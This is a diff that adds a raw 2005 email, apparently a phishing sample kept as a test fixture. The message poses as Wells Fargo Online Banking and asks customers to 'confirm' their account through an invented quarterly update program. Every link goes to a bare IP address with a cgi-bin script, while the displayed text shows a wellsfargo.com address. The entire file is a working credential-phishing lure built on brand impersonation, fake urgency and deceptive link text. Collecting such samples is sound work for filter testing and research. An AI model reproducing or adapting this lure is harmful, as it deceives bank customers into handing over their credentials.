@@ -1,0 +1,74 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 9C0412A88C
+	for <user@example.com>; Tue, 20 Sep 2005 18:55:43 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 91498621CA6; Tue, 20 Sep 2005 18:55:43 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 79195621C95
+	for <user@example.com>; Tue, 20 Sep 2005 18:55:43 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id SAA03392
+	for user@example.com; Tue, 20 Sep 2005 18:55:43 -0400
+Received: from ferrari.elinuxservers.com (ferrari.elinuxservers.com [66.159.239.3] (may be forged))
+	by mail.example.com with ESMTP id SAA03384
+	for <user@example.com>; Tue, 20 Sep 2005 18:55:42 -0400
+Received: from nobody by ferrari.elinuxservers.com with local (Exim 4.52)
+	id 1EHr1Z-0005yd-GO
+	for user@example.com; Tue, 20 Sep 2005 15:55:41 -0700
+To: user@example.com
+Subject: Update Information - Verification Required
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+From: Wells Fargo Online Banking <accounts@wellsfargo.com>
+Reply-To: accounts@wellsfargo.com
+X-Mailer: PHP/4.3.11
+Message-Id: <E1EHr1Z-0005yd-GO@ferrari.elinuxservers.com>
+Date: Tue, 20 Sep 2005 15:55:41 -0700
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - ferrari.elinuxservers.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - ferrari.elinuxservers.com
+Content-Length: 2018
+Lines: 32
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 154
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css">
+<!--
+.style2 {font-size: 12px}
+-->
+</style>
+</head>
+<body>
+<p><img src="http://a248.e.akamai.net/7/248/1856/6fbc90232ac38d/www.wellsfargo.com/img/eal_logo_gen.gif"></p>
+<p>Dear Wells Fargo customer,</p>
+<p> As you may already know, we at Wells Fargo guarantee your <a href="http://64.5.51.192/%7Escents/cgi-bin/index.php">online 
+  security</a> and partner with you to <a href="http://64.5.51.192/%7Escents/cgi-bin/index.php">prevent 
+  fraud</a>. Due to the newly introduced Comprehensive Quarterly Updates Program 
+  (which is meant to help you against identity theft, monitor your credit and 
+  correct any possible errors), we urge you to go through the 2 steps Wells Fargo 
+  Account Confirmation process. The operation involves logging in and confirming 
+  your identity over a secure connection at: </p>
+<p><a href="http://64.5.51.192/%7Escents/cgi-bin/index.php">http://www.wellsfargo.com/confirmation/update/signon?SIGNON&amp;XCP=1010</a></p>
+<p>After completing the operation, you will be informed whether or not your account has been confirmed with Comprehensive Quarterly.</p>
+<p>Thank you for working with us in combating online fraud and also, for choosing Wells Fargo as your Financial Institution.</p>
+<p><span class="style2">When you use Wells Fargo Online &reg; or Wells Fargo Business 
+  Online &reg; Banking, e guarantee that you will be covered 100% for any funds 
+  improperly removed from your Wells Fargo accounts, while we are handling your 
+  transactions, subject to your responsibility, described below. </span><span class="style2"> 
+  Brokerage accounts offered through Wells Fargo Investments, LLC (member SIPC), 
+  a non-bank affiliate of Wells Fargo &amp; Company. <br>
+&copy; 1999 - 2005 Wells Fargo Bank. All rights reserved.</span></p>
+
